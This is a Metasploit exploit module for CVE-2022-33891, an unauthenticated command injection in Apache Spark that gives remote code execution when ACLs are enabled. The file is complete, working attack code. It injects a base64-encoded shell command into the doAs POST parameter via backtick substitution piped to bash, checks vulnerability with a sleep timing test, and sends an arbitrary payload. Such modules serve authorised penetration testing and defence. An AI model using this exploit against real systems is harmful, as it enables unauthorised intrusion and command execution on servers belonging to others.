##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Spark Unauthenticated Command Injection RCE',
        'Description' => %q{
          This module exploits an unauthenticated command injection vulnerability in Apache Spark.
          Successful exploitation results in remote code execution under the context of the Spark application user.
          
          The command injection occurs because Spark checks the group membership of the user passed 
          in the ?doAs parameter by using a raw Linux command.
          
          It is triggered by a non-default setting called spark.acls.enable.
          This configuration setting spark.acls.enable should be set true in the Spark configuration to make the application vulnerable for this attack.
 
          Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1 are affected by this vulnerability.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kostya Kortchinsky', # Security researcher and discovery of the vulnerability
          'H00die Gr3y <h00die.gr3y[at]gmail.com>', # Author & Metasploit module
        ],
        'References' => [
          ['URL', 'https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc'], # Disclosure
          ['URL', 'https://attackerkb.com/topics/5FyKBES4BL/cve-2022-33891'], # Analysis
          ['CVE', '2022-33891']
        ],
        'DefaultOptions' => {
          'SSL' => false,
          'WfsDelay' => 5
        },
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :in_memory
            }
          ],
        ],
        'CmdStagerFlavor' => ['printf'],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2022-07-18',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])
      ]
    )
  end

  def execute_command(cmd, _opts = {})
      b64 = Rex::Text.encode_base64(cmd)
      post_data = "doAs=\`echo #{b64} | base64 -d | bash\`"
      
      return send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/'),
        'data' => post_data
      })
      
      rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Errno::ETIMEDOUT
        return nil
  end

  def check
    print_status("Checking if #{peer} can be exploited!")
    
    res = execute_command('testing')

    return CheckCode::Unknown("Didn't receive a response from #{peer}") unless res
    
    if res.code != 403
      return CheckCode::Safe("The #{peer} did not respond a 403 response.")
    else 
      print_status("Perform sleep test of 10 seconds...")
      t1 = Time.now
      res = execute_command('sleep 10') 
      t2 = Time.now
      delta = t2-t1
      if ((8..14) === delta)
         return CheckCode::Vulnerable("Sleep was around 10 seconds [#{delta}]!")
      else 
        return CheckCode::Unknown("Sleep test of 10 seconds was not successful!")
      end
    end
  end

  def exploit
    print_status("Exploiting...")
    case target['Type']
    when :in_memory
      execute_command(payload.encoded)
    end
  end
end
